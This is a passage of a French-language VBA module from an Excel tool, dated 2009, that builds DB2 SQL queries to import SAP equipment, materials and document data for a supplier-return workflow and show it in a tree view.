Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "C_Import_Simon"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Import de donn|fffd|es SAP, Retour Fournisseur
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/02/2009
'[Version       : V1.2 du 7/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Retour Fournisseur
'[---------------------------------------------------------------------------


'Probl|fffd|mes |fffd| Traiter
'-------------------

    'Import avec Ajout de Donn|fffd|es ou suppression de donn|fffd|es
    
    'Alimenter l'onglet Affaire (Division et M|fffd|tier)
    
    'Ref_Four et Nom_Four Vide ou "****" ou "SAP"
    
    'Documents associ|fffd|s aux EFP, FP, SFP, OP, GE, E, SE |fffd| quoi les associer ?
    
    'Documenter le champ DecNomencl, fourniture Mat|fffd|riels et Documents
    
    'Comment exploiter les donn|fffd|es de la GED - IS GED ou autre
    'Ou trouver les D|fffd|signations d'articles dans la Langue Locale
    
    'Faire tests sur Equipements avec 5 Niveaux, ou Anomalies Construction Niveaux
        'Univers    = "W0NOSA" ou "W0NOSA"
        'Division   = "SA01"      "SA01"
        'Metier     = "P"         "M"
        'ligne      = "001"       "1-2"
        'Efp        = "H2O"       "FIM"
        'Fp         = "PRO-"      "F17-"
        'Sfp        = "APAB"      "PRO-"
        'Op         = "AP04"      "PARA"
        '                         "1230774"


Public bCheckBox_RequeteMAX As Boolean


Sub Bouton_Import_Simon()
    If ArcaCls.Controle_Authentification_Effectue Then frmImportSimon.Show
End Sub


Sub Extraction_SAP_SIMON()
    frmProgression.FlagAbandon = 0
    frmProgression.lblN|fffd|Traitement = 7
    frmProgression.Show
End Sub


Sub Import_SAP_SIMON()
    Dim Univers As String, Division As String, Metier As String, Ligne As String
    Dim Efp As String, Fp As String, Sfp As String, Op As String, Equipements As String
    Dim MsgInfo As String, MsgInfo2 As String
    
    With frmImportSimon
        On Error Resume Next
        If .cmbDivisions.ListIndex > -1 Then Division = .cmbDivisions.list(.cmbDivisions.ListIndex, 1)
        If .cmbDivisions.ListIndex > -1 Then Univers = .cmbDivisions.list(.cmbDivisions.ListIndex, 2)
        If .cmbMetiers.ListIndex > -1 Then Metier = .cmbMetiers.list(.cmbMetiers.ListIndex, 1)
        If .cmbLignes.ListIndex > -1 Then Ligne = .cmbLignes.list(.cmbLignes.ListIndex, 1)
        bCheckBox_RequeteMAX = .CheckBox_RequeteMAX
        On Error GoTo 0
    
        Dim nodX As Node
        Dim Nb As Integer
        For Each nodX In .TreeView.Nodes
            '"IN ('F', '0') "
            If nodX.Checked = True And VBA.Left(nodX.Key, 2) = "E_" Then 'EFP
                If Efp <> vbNullString Then Efp = Efp & ", "
                Efp = Efp & "'" & nodX.Tag & "'"
            ElseIf nodX.Checked = True And VBA.Left(nodX.Key, 2) = "F_" Then 'FP
                If Fp <> vbNullString Then Fp = Fp & ", "
                Fp = Fp & "'" & nodX.Tag & "'"
            ElseIf nodX.Checked = True And VBA.Left(nodX.Key, 2) = "S_" Then 'SFP
                If Sfp <> vbNullString Then Sfp = Sfp & ", "
                Sfp = Sfp & "'" & nodX.Tag & "'"
            ElseIf nodX.Checked = True And VBA.Left(nodX.Key, 2) = "O_" Then 'OP
                If Op <> vbNullString Then Op = Op & ", "
                Op = Op & "'" & nodX.Tag & "'"
            ElseIf nodX.Checked = True And VBA.Left(nodX.Key, 2) = "Q_" Then 'Equipement
                If Equipements <> vbNullString Then Equipements = Equipements & ", "
                Equipements = Equipements & "'" & nodX.Tag & "'"
                Nb = Nb + 1
            End If
        Next
    End With
    
    If Univers = vbNullString Or Division = vbNullString Or Metier = vbNullString Or Ligne = vbNullString Or Nb = 0 Then Exit Sub
    
    Unload frmImportSimon
    
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportOnglet")
    MsgInfo2 = IniCls.ReadStringIniLangage("MsgFWK", "MsgAttenteIS")
    
    frmProgression.UpdateProgress 0 / 4, MsgInfo & " : Purge du TDI", 0
    Purge_TDI False
            
    If frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 1 / 9, MsgInfo & " : " & shDecoupage & vbCrLf & MsgInfo2, frmProgression.FlagAbandon
        Extraction_IS_SIMON Requete_Decoupage(Univers, Division, Metier, Ligne, Efp, Fp, Sfp, Op), Nothing, True, shDecoupage, Equipements
    End If
    
    If frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 3 / 9, MsgInfo & " : " & shMateriels & vbCrLf & MsgInfo2, frmProgression.FlagAbandon
        Extraction_IS_SIMON Requete_Materiels(Univers, Division, Metier, Ligne, Efp, Fp, Sfp, Op, Equipements), Nothing, True, shMateriels, vbNullString
    End If

    If frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 5 / 9, MsgInfo & " : Documents / Materiels" & vbCrLf & MsgInfo2, frmProgression.FlagAbandon
        Extraction_IS_SIMON Requete_Doc_Materiels(Univers, Division, Metier, Ligne, Efp, Fp, Sfp, Op), Nothing, True, "Doc_Materiels", vbNullString
    End If
    
    If frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 7 / 9, MsgInfo & " : " & shDocuments & vbCrLf & MsgInfo2, frmProgression.FlagAbandon
        Extraction_IS_SIMON Requete_Doc_Equipements(Univers, Division, Metier, Ligne, Efp, Fp, Sfp, Op), Nothing, True, shDocuments, vbNullString
        Eclatement_Suffixes_Purge 'N|fffd|cessaire pour le Tri sur 4 Crit|fffd|re
    End If
    
    If frmProgression.FlagAbandon = 0 Then
        Unload frmProgression
        Mise_en_Forme_TDI
    End If
    
    ThisWorkbook.Worksheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub


Function Requete_Decoupage(Univers As String, Div As String, Met As String, Lig As String, Efp As String, Fp As String, Sfp As String, Op As String) As String
    Dim Req As String, Req2 As String, Req3 As String, Req4 As String
    
    Req = "SELECT DISTINCT " & _
      Univers & ".TPT.DIV_PT, " & _
      Univers & ".TPT.DES_DIV, " & _
      Univers & ".TPT.MET, " & _
      Univers & ".TPT.DES_MET, " & _
      Univers & ".TPT.LIG, " & _
      Univers & ".TPT.DES_LIG, " & _
      Univers & ".TPT.EFP, " & _
      Univers & ".TPT.DES_EFP, " & _
      Univers & ".TPT.FP, " & _
      Univers & ".TPT.DES_FP, " & _
      Univers & ".TPT.SFP, " & _
      Univers & ".TPT.DES_SFP, " & _
      Univers & ".TPT.OP, " & _
      Univers & ".TPT.DES_OP, " & _
      Univers & ".TEQT.ZONE_TRI, " & _
      Univers & ".TARBEQ.EQT_SUP, " & _
      Univers & ".TEQT.ID_EQT, " & _
      Univers & ".TEQT.DT_MODIF, " & _
      Univers & ".TEQT.CTG_S, " & _
      Univers & ".TEQT.DES_MAT, " & _
      Univers & ".TEQT.DES_EQT, "
    Req = Req & _
      Univers & ".TEQT.REF_INT, " & _
      Univers & ".TEQT.NOM_INT, " & _
      Univers & ".TEQT.NUM_IMMO, " & _
      Univers & ".TEQT.REF_FOUR, " & _
      Univers & ".TEQT.NOM_FOUR, " & _
      Univers & ".TEQT.NIV, " & _
      Univers & ".TEQT.QTE, " & _
      Univers & ".TEQT.CD_ART, " & _
      Univers & ".TEQT.MAINT_EQT, " & _
      Univers & ".TEQT.LICENCE, " & _
      Univers & ".TEQT.COD_FAM, " & _
      Univers & ".TEQT.CTG, " & _
      Univers & ".TEQT.MAT "
    
    Req = Req & "FROM " & _
      Univers & ".TPT LEFT OUTER JOIN " & Univers & ".TEQT ON " & Univers & ".TPT.PT = " & Univers & ".TEQT.PT, " & _
      Univers & ".TARBEQ "
      
    Req = Req & "WHERE " & _
      Univers & ".TARBEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
      "AND ((" & Univers & ".TPT.FLAG_SUPPR <> 'X') OR( " & Univers & ".TPT.FLAG_SUPPR IS NULL)) " & _
      "AND ((" & Univers & ".TEQT.FLAG_SUP <> 'X') OR ( " & Univers & ".TEQT.FLAG_SUP IS NULL)) " '& _
'      "AND (" & Univers & ".TEQT.NIV <> 'S/E') "

    If Div <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.DIV_PT = '" & Div & "' "
    If Met <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.MET = '" & Met & "' "
    If Lig <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.LIG = '" & Lig & "' "
    
    If Efp <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.EFP IN (" & Efp & ") "
    
    Requete_Decoupage = Req
    
    If Fp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req2 = Req
            Req2 = Req2 & " AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Decoupage = Requete_Decoupage & " union " & Req2
        Else
            Req = Req & " AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Decoupage = Req
        End If
    End If
    
    If Sfp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req3 = Req
            Req3 = Req3 & " AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Decoupage = Requete_Decoupage & " union " & Req3
        Else
            Req = Req & " AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Decoupage = Req
        End If
    End If
    
    If Op <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req4 = Req
            Req4 = Req4 & " AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Decoupage = Requete_Decoupage & " union " & Req4
        Else
            Req = Req & " AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Decoupage = Req
        End If
    End If
    
    Requete_Decoupage = Requete_Decoupage & " ORDER BY ID_EQT "

End Function


Function Requete_Materiels(Univers As String, Div As String, Met As String, Lig As String, Efp As String, Fp As String, Sfp As String, Op As String, Equipements As String) As String
    Dim Req As String, Req2 As String, Req3 As String, Req4 As String

    Req = "SELECT DISTINCT " & _
        Univers & ".TARBEQ.NIV_SUP, " & _
        Univers & ".TARBEQ.EQT_SUP, " & _
        Univers & ".TARBEQ.DES_SUP, " & _
        Univers & ".TEQT.NIV, " & _
        Univers & ".TEQT.ID_EQT, " & _
        Univers & ".TEQT.DES_EQT, " & _
        Univers & ".TNOM.REF_FOURP, " & _
        Univers & ".TNOM.NOM_FOURP, " & _
        "W0NOAR.TART.REF_FOUR REF_FOUR_ART, " & _
        "W0NOAR.TART.NOM_FOUR NOM_FOUR_ART, " & _
        Univers & ".TNOM.MT_CLEP, " & _
        Univers & ".TNOM.REF_INTP, " & _
        Univers & ".TNOM.NOM_INTP, " & _
        Univers & ".TNOM.QTEP, " & _
        Univers & ".TNOM.CD_ARTP, " & _
        Univers & ".TNOM.TXT_NOMP, " & _
        Univers & ".TEQT.REF_FOUR, " & _
        "W0NOAR.TART.CD_ART, " & _
        "W0NOAR.TART.CTG, " & _
        "W0NOAR.TART.TECH, " & _
        "W0NOAR.TART.TYPE_ARTICLE, " & _
        "W0NOAR.TART.TYP_MAT, " & _
        "W0NOAR.TART.DES_ART "

    Req = Req & "FROM " & _
        Univers & ".TARBEQ, " & _
        Univers & ".TPT LEFT OUTER JOIN " & Univers & ".TEQT ON " & Univers & ".TPT.PT = " & Univers & ".TEQT.PT " & _
        "LEFT OUTER JOIN " & Univers & ".TNOM ON " & Univers & ".TEQT.ID_EQT = " & Univers & ".TNOM.ID_EQT " & _
        "RIGHT OUTER JOIN W0NOAR.TART ON " & Univers & ".TNOM.CD_ARTP = W0NOAR.TART.CD_ART "
     
    Req = Req & "WHERE " & _
        Univers & ".TARBEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
        "AND ((" & Univers & ".TPT.FLAG_SUPPR <> 'X') OR ( " & Univers & ".TPT.FLAG_SUPPR IS NULL)) " & _
        "AND ((" & Univers & ".TEQT.FLAG_SUP <> 'X') OR ( " & Univers & ".TEQT.FLAG_SUP IS NULL)) " '& _
'        "AND (" & Univers & ".TEQT.NIV <> 'S/E') "
        

    If Div <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.DIV_PT = '" & Div & "' "
    If Met <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.MET = '" & Met & "' "
    If Lig <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.LIG = '" & Lig & "' "
   
    If Efp <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.EFP IN (" & Efp & ") "
    If Equipements <> vbNullString Then
        Req = Req & "AND (" & Univers & ".TARBEQ.EQT_SUP IN (" & Equipements & ") "
        Req = Req & "OR " & Univers & ".TARBEQ.ID_EQT IN (" & Equipements & ")) "
    End If
    
    Requete_Materiels = Req
    
    If Fp <> vbNullString Then
        Req2 = Req
        Req2 = Req2 & "AND " & Univers & ".TPT.FP IN (" & Fp & ") "
        If Equipements <> vbNullString Then Req2 = Req2 & "AND " & Univers & ".TARBEQ.EQT_SUP IN (" & Equipements & ") "
        Requete_Materiels = Requete_Materiels & " union " & Req2
    End If
    
    If Sfp <> vbNullString Then
        Req3 = Req
        Req3 = Req3 & "AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
        If Equipements <> vbNullString Then Req3 = Req3 & "AND " & Univers & ".TARBEQ.EQT_SUP IN (" & Equipements & ") "
        Requete_Materiels = Requete_Materiels & " union " & Req3
    End If
    
    If Op <> vbNullString Then
        Req4 = Req
        Req4 = Req4 & "AND " & Univers & ".TPT.OP IN (" & Op & ") "
        If Equipements <> vbNullString Then
            Req4 = Req4 & "AND (" & Univers & ".TARBEQ.EQT_SUP IN (" & Equipements & ") "
            Req4 = Req4 & "OR " & Univers & ".TARBEQ.ID_EQT IN (" & Equipements & ")) "
        End If
        Requete_Materiels = Requete_Materiels & " union " & Req4
    End If

End Function


Function Requete_Doc_Materiels(Univers As String, Div As String, Met As String, Lig As String, Efp As String, Fp As String, Sfp As String, Op As String) As String
    Dim Req As String, Req2 As String, Req3 As String, Req4 As String
            
    Req = "SELECT DISTINCT " & _
            Univers & ".TDOCAR.DOC DOC_ART, " & _
            Univers & ".TNOM.CD_ARTP " & _
          "FROM " & _
            Univers & ".TARBEQ, " & _
            Univers & ".TPT LEFT OUTER JOIN " & Univers & ".TEQT ON " & Univers & ".TPT.PT = " & Univers & ".TEQT.PT " & _
            "LEFT OUTER JOIN " & Univers & ".TNOM ON " & Univers & ".TEQT.ID_EQT = " & Univers & ".TNOM.ID_EQT " & _
            "LEFT OUTER JOIN " & Univers & ".TDOCAR ON " & Univers & ".TNOM.CD_ARTP = " & Univers & ".TDOCAR.CD_ART " & _
          "WHERE " & _
            Univers & ".TARBEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
            "AND " & Univers & ".TPT.FLAG_SUPPR <> 'X' " & _
            "AND " & Univers & ".TEQT.FLAG_SUP <> 'X' "

    If Div <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.DIV_PT = '" & Div & "' "
    If Met <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.MET = '" & Met & "' "
    If Lig <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.LIG = '" & Lig & "' "
    If Efp <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.EFP IN (" & Efp & ") "
    
    Requete_Doc_Materiels = Req
    
    If Fp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req2 = Req
            Req2 = Req2 & "AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Doc_Materiels = Requete_Doc_Materiels & " UNION " & Req2
        Else
            Req = Req & " AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Doc_Materiels = Req
        End If
    End If
    
    If Sfp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req3 = Req
            Req3 = Req3 & "AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Doc_Materiels = Requete_Doc_Materiels & " UNION " & Req3
        Else
            Req = Req & " AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Doc_Materiels = Req
        End If
    End If
    
    If Op <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req4 = Req
            Req4 = Req4 & "AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Doc_Materiels = Requete_Doc_Materiels & " UNION " & Req4
        Else
            Req = Req & " AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Doc_Materiels = Req
        End If
    End If
    
End Function


Function Requete_Doc_Equipements(Univers As String, Div As String, Met As String, Lig As String, Efp As String, Fp As String, Sfp As String, Op As String) As String
    Dim Req As String, Req2 As String, Req3 As String, Req4 As String
    
    Req = "SELECT DISTINCT " & _
          Univers & ".TDOCEQ.DOC_SUP, " & _
          Univers & ".TEQT.ID_EQT, " & _
          Univers & ".TDOCEQ.DOC, " & _
          Univers & ".TEQT.CTG_S, " & _
          Univers & ".TEQT.NOM_FOUR, " & _
          Univers & ".TEQT.REF_FOUR " & _
        "FROM " & _
          Univers & ".TARBEQ, " & _
          Univers & ".TDOCEQ LEFT OUTER JOIN " & Univers & ".TEQT ON " & Univers & ".TDOCEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
             "LEFT OUTER JOIN " & Univers & ".TPT ON " & Univers & ".TPT.PT = " & Univers & ".TEQT.PT " & _
        "WHERE " & _
          Univers & ".TARBEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
          "AND " & Univers & ".TPT.FLAG_SUPPR <> 'X' " & _
          "AND " & Univers & ".TEQT.FLAG_SUP <> 'X' "

    If Div <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.DIV_PT = '" & Div & "' "
    If Met <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.MET = '" & Met & "' "
    If Lig <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.LIG = '" & Lig & "' "
    If Efp <> vbNullString Then Req = Req & "AND " & Univers & ".TPT.EFP IN (" & Efp & ") "
    
    Requete_Doc_Equipements = Req
    
    If Fp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req2 = Req
            Req2 = Req2 & "AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Doc_Equipements = Requete_Doc_Equipements & " UNION " & Req2
        Else
            Req = Req & " AND " & Univers & ".TPT.FP IN (" & Fp & ") "
            Requete_Doc_Equipements = Req
        End If
    End If
    
    If Sfp <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req3 = Req
            Req3 = Req3 & "AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Doc_Equipements = Requete_Doc_Equipements & " UNION " & Req3
        Else
            Req = Req & " AND " & Univers & ".TPT.SFP IN (" & Sfp & ") "
            Requete_Doc_Equipements = Req
        End If
    End If
    
    If Op <> vbNullString Then
        If bCheckBox_RequeteMAX Then
            ' Coch|fffd| : on |fffd|largit la requ|fffd|te
            Req4 = Req
            Req4 = Req4 & "AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Doc_Equipements = Requete_Doc_Equipements & " UNION " & Req4
        Else
            Req = Req & " AND " & Univers & ".TPT.OP IN (" & Op & ") "
            Requete_Doc_Equipements = Req
        End If
    End If
    
    Requete_Doc_Equipements = Requete_Doc_Equipements & " ORDER BY ID_EQT, DOC_SUP"
    
End Function

Function Extraction_IS_SIMON(Req_Sql As String, Liste As Object, ToTDI As Boolean, shResult As String, Equipements As String) As Boolean
    Dim Dsn     As String
    Dim Login   As String
    Dim Psw     As String
    
    Message_Patientez True
    Dim adoConnection As ADODB.Connection
    Dim adoRecordset  As ADODB.Recordset
    
    Extraction_IS_SIMON = False
    If Application.OperatingSystem = "Windows (32-bit) NT 5.01" Then Dsn = "IS" Else Dsn = "IS_ODBC"                     'on consid|fffd|re qu'on est sur ACE1
    IniCls.ReadStringIniMain "BASE_INFOSERVICE", "Dsn", Dsn
    IniCls.ReadStringIniMain "Login", "Login", Login
    IniCls.ReadStringIniMain "Login", "Psw", Psw
    'Stop
    'Cr|fffd|ation d'une nouvelle Connexion
    Set adoConnection = New ADODB.Connection
    
    ' On force le provider sinon Provider = MSDASQL
    adoConnection.Provider = "IBMDADB2.DB2"
    
    'Construction de la Chaine de Connexion
    If Application.OperatingSystem = "Windows (32-bit) NT 5.01" Then Dsn = "IS" Else Dsn = "IS_ODBC"                     'on consid|fffd|re qu'on est sur ACE1
    adoConnection.ConnectionString = ";UID=" & CryptCls.Decode(Login) & ";PWD=" & CryptCls.Decode(Psw) & ";" & "DSN=" & Dsn '& ";CCSID=20880;CP=855"
    
    'V|fffd|rifie que la connexion est bien ferm|fffd|e
    If adoConnection.State = adStateOpen Then adoConnection.Close
    
    On Error GoTo BadConnexion
    
    'Connexion |fffd| la base de donn|fffd|es
    adoConnection.Open
    
    'Attente que la connexion soit |fffd|tablie
    While (adoConnection.State = adStateConnecting)
        DoEvents
    Wend
    
    If adoConnection Is Nothing Then Exit Function
    
    If adoConnection.State <> adStateOpen Then MsgCls.ShowMessage "MsgBaseError", vbCrLf & vbCrLf & Dsn, vbNullString, vbNullString, vbOKOnly + vbCritical: Exit Function
    
    'Cr|fffd|ation d'un Recordset
    Set adoRecordset = New ADODB.Recordset
    
    'Ouverture de la Table
    adoConnection.CommandTimeout = 1800 '1800/60=30mn, 30 par d|fffd|faut
    
    With adoRecordset
        .Open Req_Sql, adoConnection, CursorType:=adOpenForwardOnly, LockType:=adLockReadOnly, Options:=-1
    
        If Not (.EOF) Then
            'AdoCls.ExportExcel adoRecordset, shResult, True
            'Alimenter la liste
            If ToTDI Then
                Import_SAP adoRecordset, shResult, Equipements
            ElseIf Liste.Name = "TreeView" Then
                Initialisation_Treeview adoRecordset, Liste
            Else 'Vers une liste |fffd| s|fffd|lection
                .MoveFirst
                Do While Not (.EOF)
                    If Not (IsNull(.Fields(0).Value)) Then
                        Liste.AddItem
                        If IsNull(.Fields(1).Value) Then Liste.list(Liste.ListCount - 1, 0) = vbNullString Else Liste.list(Liste.ListCount - 1, 0) = .Fields(1).Value
                        Liste.list(Liste.ListCount - 1, 1) = .Fields(0).Value
                        .MoveNext
                    Else
                        Exit Do
                    End If
                Loop
            End If
        Else
            'MsgBox "Pas de R|fffd|sultats !"
        End If
        ' On ferme le recordSet
        .Close
    End With
    Set adoRecordset = Nothing
    
Fin:
    adoConnection.Close
    Set adoConnection = Nothing
    Message_Patientez False
    Extraction_IS_SIMON = True
    
    Exit Function
    
BadConnexion:
    Message_Patientez False
'    ThisWorkbook.Sheets("temp").Cells(1, 1).Value = Req_Sql
    frmProgression.FlagAbandon = True
    If adoConnection.Errors.Count > 0 Then MsgCls.ShowMessage "MsgBaseError", vbCrLf & Dsn & vbCrLf & vbCrLf, "MsgBusinessObject", vbNullString, vbOKOnly + vbCritical Else MsgCls.ShowMessage "MsgBaseError", vbCrLf & Dsn & vbCrLf & vbCrLf, "MsgBusinessObject", vbNullString, vbOKOnly + vbCritical
End Function


Sub Message_Patientez(Voir As Boolean)
    If Voir Then frmImportSimon.lblPatientez.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours")
    frmImportSimon.lblPatientez.Visible = Voir
    frmImportSimon.Repaint
End Sub


Sub Initialisation_Treeview(adoRecordset As ADODB.Recordset, TreeView As Object)
    Dim iColIndex As Integer
    Dim Index As Long
    Dim Division As String, Metier As String, Ligne As String, MLigne As String, Efp As String, MEfp As String
    Dim Fp As String, Mfp As String, Sfp As String, MSfp As String, Op As String, MOp As String
    Dim Eqt As String, MEqt As String, Pt_Pose As String, dbText As String, sChaine As String
    
    Application.EnableEvents = False
    TreeView.Nodes.Clear 'Efface Tout
    If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value = "RU" Then TreeView.Font.Charset = Charsets.RUSSIAN_CHARSET Else TreeView.Font.Charset = Charsets.EASTEUROPE_CHARSET
    
    Index = 0
    With adoRecordset
        .MoveFirst
        Do While Not (.EOF)
            For iColIndex = 0 To adoRecordset.Fields.Count - 1
                Index = Index + 1 'Pour |fffd|viter d'avoir des doublons sur les Cl|fffd|s
                sChaine = .Fields(iColIndex).Name
                If sChaine = "DIV_PT" Then 'Racine
                        If Division <> VBA.Trim(.Fields("DIV_PT").Value) Then
                            Division = VBA.Trim(.Fields("DIV_PT").Value)
                            If IsNull(.Fields("DES_DIV").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_DIV").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add , , Division, "Division " & dbText, "Division"
                            Else
                                TreeView.Nodes.Add , , Division, "Division " & convertString(dbText, 1251), "Division"
                            End If
                            'TreeView.Nodes.Add , , Division, "Division " & VBA.Trim(adoRecordset.Fields("DES_DIV").Value), "Division"
                            'TreeView.Nodes.Add , , Division, "Division " & VBA.Trim(adoRecordset.Fields("DES_DIV").Value), "Division" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Expanded = True
                        End If
    
                ElseIf sChaine = "MET" Then
                        If Metier <> VBA.Trim(.Fields("MET").Value) And VBA.Trim(.Fields("MET").Value) <> vbNullString Then
                            Metier = VBA.Trim(.Fields("MET").Value)
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "MET", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_MET").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_MET").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Metier, "Metier " & Metier & ", " & dbText, "Metier" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Metier, "Metier " & Metier & ", " & convertString(dbText, 1251), "Metier" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Metier, "Metier " & Metier & ", " & vba.StrConv(VBA.Trim(adoRecordset.Fields("DES_MET").Value), vbFromUnicode, Charsets.RUSSIAN_CHARSET), "Metier" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Expanded = True
                        End If
                        
                ElseIf sChaine = "LIG" Then
                        If Ligne <> VBA.Trim(.Fields("LIG").Value) And VBA.Trim(.Fields("LIG").Value) <> vbNullString Then
                            Efp = vbNullString
                            Ligne = VBA.Trim(.Fields("LIG").Value)
                            MLigne = "L_" & Ligne & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "LIG", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_LIG").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_LIG").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MLigne, "Ligne " & Ligne & ", " & dbText, "Ligne" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MLigne, "Ligne " & Ligne & ", " & convertString(dbText, 1251), "Ligne" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MLigne, "Ligne " & ligne & ", " & VBA.Trim(adoRecordset.Fields("DES_LIG").Value), "Ligne" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Expanded = True
                        End If
                        
                ElseIf sChaine = "EFP" Then
                        If Efp <> VBA.Trim(.Fields("EFP").Value) And VBA.Trim(.Fields("EFP").Value) <> vbNullString Then
                            Fp = vbNullString
                            Efp = VBA.Trim(.Fields("EFP").Value)
                            MEfp = "E_" & Efp & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "EFP", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_EFP").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_EFP").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEfp, "Efp " & Efp & ", " & dbText, "EFP" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEfp, "Efp " & Efp & ", " & convertString(dbText, 1251), "EFP" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEfp, "Efp " & Efp & ", " & VBA.Trim(adoRecordset.Fields("DES_EFP").Value), "EFP" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Tag = Efp
                        End If
    
                ElseIf sChaine = "FP" Then
                        If Fp <> VBA.Trim(.Fields("FP").Value) And VBA.Trim(.Fields("FP").Value) <> vbNullString Then
                            Sfp = vbNullString
                            Fp = VBA.Trim(.Fields("FP").Value)
                            Mfp = "F_" & Fp & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "FP", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_FP").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_FP").Value)
